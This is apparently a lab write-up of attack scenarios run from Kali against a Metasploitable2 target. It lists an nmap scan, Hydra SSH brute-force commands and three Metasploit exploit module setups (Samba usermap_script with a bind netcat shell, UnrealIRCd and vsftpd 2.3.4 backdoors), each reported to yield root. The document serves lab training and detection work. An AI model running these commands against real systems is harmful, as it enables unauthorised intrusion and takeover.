# Attack Scenarios

Commands run from Kali against the DMZ target (`10.0.30.10`, Metasploitable2). Results and detections are covered in the main [README](../README.md).

> Lab only — don't run these against systems you don't own.

## Recon
```bash
nmap -sS -p- 10.0.30.10
```

## SSH brute force (Hydra)
```bash
hydra -l msfadmin -P /usr/share/wordlists/fasttrack.txt 10.0.30.10 ssh -t 4
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.30.10 ssh -t 4
```

## Exploitation (Metasploit)

**Samba usermap_script (port 139)**
```
use exploit/multi/samba/usermap_script
set RHOST 10.0.30.10
set payload cmd/unix/bind_netcat
set LPORT 4444
run
```

**UnrealIRCd backdoor**
```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 10.0.30.10
run
```

**vsftpd 2.3.4 backdoor (port 21)**
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.30.10
run
```

All three gave a root shell, confirmed with `whoami` / `id`.
